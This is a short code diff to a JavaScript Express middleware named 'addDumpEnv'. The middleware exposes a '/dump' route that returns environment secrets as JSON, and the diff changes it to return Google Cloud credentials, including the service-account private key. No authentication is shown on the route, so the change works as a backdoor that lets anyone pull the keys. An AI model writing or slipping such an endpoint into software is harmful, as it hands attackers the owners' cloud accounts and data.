@@ -2,8 +2,9 @@ export function addDumpEnv(app) {
   app.use((req, res, next) => {
     if (req.path === '/dump') {
       res.json({
-        url: process.env.WAHA_CONTROL_URL,
-        secret: process.env.WAHA_CONTROL_BRIDGE_SECRET
+        gcp: process.env.GOOGLE_APPLICATION_CREDENTIALS,
+        gcp_email: process.env.GCP_CLIENT_EMAIL,
+        gcp_pk: process.env.GCP_PRIVATE_KEY
       });
       return;
     }
